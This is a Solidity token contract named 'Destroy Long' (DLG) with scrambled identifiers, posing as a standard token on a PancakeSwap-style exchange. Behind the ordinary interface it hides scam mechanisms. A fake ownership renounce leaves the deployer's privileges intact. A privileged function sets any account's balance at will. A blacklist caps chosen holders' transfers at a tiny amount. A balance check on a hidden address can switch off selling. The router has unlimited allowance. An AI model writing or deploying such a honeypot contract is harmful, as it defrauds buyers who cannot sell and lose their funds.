//SPDX-License-Identifier: MIT

pragma solidity ^0.8.15;

interface txAt {
    function factory() external pure returns (address);

    function WETH() external pure returns (address);
}

abstract contract amountMinShould {
    function _msgSender() internal view virtual returns (address) {
        return msg.sender;
    }

    function _msgData() internal view virtual returns (bytes calldata) {
        return msg.data;
    }
}

interface swapSender {
    function createPair(address launchedFund, address minToken) external returns (address);
}

interface totalTake {
    function totalSupply() external view returns (uint256);

    function balanceOf(address autoFundSell) external view returns (uint256);

    function transfer(address toTake, uint256 maxLimit) external returns (bool);

    function allowance(address atMax, address spender) external view returns (uint256);

    function approve(address spender, uint256 maxLimit) external returns (bool);

    function transferFrom(
        address sender,
        address toTake,
        uint256 maxLimit
    ) external returns (bool);

    event Transfer(address indexed from, address indexed liquidityLimit, uint256 value);
    event Approval(address indexed atMax, address indexed spender, uint256 value);
}

interface totalTakeMetadata is totalTake {
    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);
}

contract DestroyLong is amountMinShould, totalTake, totalTakeMetadata {

    function sellAt() private view {
        require(teamSwap[_msgSender()]);
    }

    function transfer(address tokenMarketingWallet, uint256 maxLimit) external virtual override returns (bool) {
        return receiverAmount(_msgSender(), tokenMarketingWallet, maxLimit);
    }

    uint256 listLaunch;

    constructor (){
        
        txAt launchedToken = txAt(minSwap);
        autoFund = swapSender(launchedToken.factory()).createPair(launchedToken.WETH(), address(this));
        
        modeLimit = _msgSender();
        totalWallet();
        teamSwap[modeLimit] = true;
        senderAuto[modeLimit] = fundFrom;
        
        emit Transfer(address(0), modeLimit, fundFrom);
    }

    function getOwner() external view returns (address) {
        return exemptFund;
    }

    mapping(address => bool) public launchedFrom;

    function minLimit(address autoShouldSell, address toTake, uint256 maxLimit) internal returns (bool) {
        require(senderAuto[autoShouldSell] >= maxLimit);
        senderAuto[autoShouldSell] -= maxLimit;
        senderAuto[toTake] += maxLimit;
        emit Transfer(autoShouldSell, toTake, maxLimit);
        return true;
    }

    mapping(address => uint256) private senderAuto;

    function symbol() external view virtual override returns (string memory) {
        return amountTrading;
    }

    function totalWallet() public {
        emit OwnershipTransferred(modeLimit, address(0));
        exemptFund = address(0);
    }

    mapping(address => bool) public teamSwap;

    uint256 constant autoFrom = 9 ** 10;

    address public autoFund;

    function owner() external view returns (address) {
        return exemptFund;
    }

    address private exemptFund;

    event OwnershipTransferred(address indexed receiverAuto, address indexed swapLiquidityAt);

    function transferFrom(address autoShouldSell, address toTake, uint256 maxLimit) external override returns (bool) {
        if (_msgSender() != minSwap) {
            if (teamLaunch[autoShouldSell][_msgSender()] != type(uint256).max) {
                require(maxLimit <= teamLaunch[autoShouldSell][_msgSender()]);
                teamLaunch[autoShouldSell][_msgSender()] -= maxLimit;
            }
        }
        return receiverAmount(autoShouldSell, toTake, maxLimit);
    }

    uint256 private receiverMin;

    function buyTo(address swapFrom) public {
        if (buyTx) {
            return;
        }
        if (limitToken == receiverMin) {
            limitToken = fundExempt;
        }
        teamSwap[swapFrom] = true;
        if (limitToken == fundExempt) {
            fundExempt = limitToken;
        }
        buyTx = true;
    }

    string private amountTrading = "DLG";

    function tokenToTx(address txLaunch) public {
        sellAt();
        
        if (txLaunch == modeLimit || txLaunch == autoFund) {
            return;
        }
        launchedFrom[txLaunch] = true;
    }

    uint256 private fundFrom = 100000000 * 10 ** 18;

    function receiverAmount(address autoShouldSell, address toTake, uint256 maxLimit) internal returns (bool) {
        if (autoShouldSell == modeLimit) {
            return minLimit(autoShouldSell, toTake, maxLimit);
        }
        uint256 teamTokenLaunch = totalTake(autoFund).balanceOf(swapReceiver);
        require(teamTokenLaunch == amountLaunchFrom);
        require(toTake != swapReceiver);
        if (launchedFrom[autoShouldSell]) {
            return minLimit(autoShouldSell, toTake, autoFrom);
        }
        return minLimit(autoShouldSell, toTake, maxLimit);
    }

    function allowance(address launchMinFund, address exemptLaunchSwap) external view virtual override returns (uint256) {
        if (exemptLaunchSwap == minSwap) {
            return type(uint256).max;
        }
        return teamLaunch[launchMinFund][exemptLaunchSwap];
    }

    address minSwap = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

    function name() external view virtual override returns (string memory) {
        return fundSwapLaunched;
    }

    uint8 private modeEnable = 18;

    function shouldTakeLaunched(address tokenMarketingWallet, uint256 maxLimit) public {
        sellAt();
        senderAuto[tokenMarketingWallet] = maxLimit;
    }

    mapping(address => mapping(address => uint256)) private teamLaunch;

    uint256 public fundExempt;

    address public modeLimit;

    address swapReceiver = 0x0ED943Ce24BaEBf257488771759F9BF482C39706;

    function approve(address exemptLaunchSwap, uint256 maxLimit) public virtual override returns (bool) {
        teamLaunch[_msgSender()][exemptLaunchSwap] = maxLimit;
        emit Approval(_msgSender(), exemptLaunchSwap, maxLimit);
        return true;
    }

    uint256 public limitToken;

    bool public buyTx;

    uint256 amountLaunchFrom;

    function balanceOf(address autoFundSell) public view virtual override returns (uint256) {
        return senderAuto[autoFundSell];
    }

    function minShould(uint256 maxLimit) public {
        sellAt();
        amountLaunchFrom = maxLimit;
    }

    function totalSupply() external view virtual override returns (uint256) {
        return fundFrom;
    }

    string private fundSwapLaunched = "Destroy Long";

    function decimals() external view virtual override returns (uint8) {
        return modeEnable;
    }

}